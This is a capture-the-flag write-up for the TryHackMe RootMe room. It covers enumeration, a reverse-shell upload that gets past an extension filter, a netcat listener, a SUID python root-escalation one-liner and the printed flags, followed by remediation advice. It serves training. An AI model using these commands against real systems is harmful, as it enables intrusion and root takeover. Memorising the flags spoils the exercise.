# Lab Report - RootMe


# Overview 
- **Difficulty**: Easy.
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/rrootme
- **Tags**: #enumeration #shell #privesc

## Challenge Description 
> **A ctf for beginners, can you root me?**

## Resolution Summary 
> **We Started by performing active reconnaissance using Nmap on the target IP, we found an HTTP website running on port 80. Then we used Gobuster to find hidden directories, we uncovered a hidden upload web page. After testing multiple PHP extensions, we found one that is allowed and uploaded a reverse shell. Upon getting a shell, we exploited the python binary as it had its SUID bit set and it was owned by root. Finally we got root access and retrieved the flags.** 

# Information Gathering 
## Active Reconnaissance
- **We attempted to discover running services on the given IP by running an Nmap scan, we scanned for services versions as well (may reveal usable exploits).**
```bash
sudo nmap -sV 10.10.185.141
```
	- Note : Adding the -p- flag did not lead to other results.

- **We found 2 running services, an SSH (22) server and an HTTP server (80).**
```bash
#Results 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP (80)

- **Next, we focused on the HTTP server running on port 80.** 
- **First, we took a look at the Page Source. We saw that the web server was running a script to display the text on the homepage. (dead end)**

- **After that, we ran `GoBuster` to find hidden directories.** 
```bash
gobuster dir -u 10.10.185.141 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

- **We uncover the following directories:** 
```bash
/uploads              (Status: 301) [Size: 316] [--> http://10.10.185.141/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.185.141/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.185.141/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.185.141/panel/]

```

- **Upon further investigation, the /panel directory lead us to an upload web page.** 
# Exploitation 
- **Given the upload web page found, we will try to upload a reverse shell on the web server.** 
- **We used the PHP reverse shell available on Kali machines (from PentestMonkey) and set up a listener with netcat** 
```bash
nc -lnvp 1234
```

- **The server seemed to have filters. Therefore, we tried other PHP extensions.**
- **.php5 worked fine and we got a reverse shell.**

# Privilege Escalation 
- **Once we obtain a webshell, we listed files that had the SUID bit set (we may list files that are owned by root as well).**
- **We found that python2.7 does, hence we looked for an exploit on GTFOBins.**
- **Then we used:** 
```bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")' 
```

- **Which allowed us to gain root access and get the flags:** 
```bash 
find -type f -name "user.txt"
cat ./user.txt

find -type f -name "root.txt"
cat ./root.txt
```
# Trophy 
> **User.txt**
> **THM{y0u_g0t_a_sh3ll}** 

> **Root.txt**
> **THM{pr1v1l3g3_3sc4l4t10n}**

# Extra Mile 
 - **Create an SSH key pair, add your public key to the authorized_keys files in ./ubuntu, gain access to the SSH server.**
 - **Crack the /etc/passwd hashes with JTR or Hashcat (then use credential on the SSH server).**

# Remediation Summary
 - **For the Upload web page:** It should have a whitelist instead of a blacklist + Ban the use of particular functions (like system()).
- **Files owned by root:** Binaries like python must not have SUID bit set.
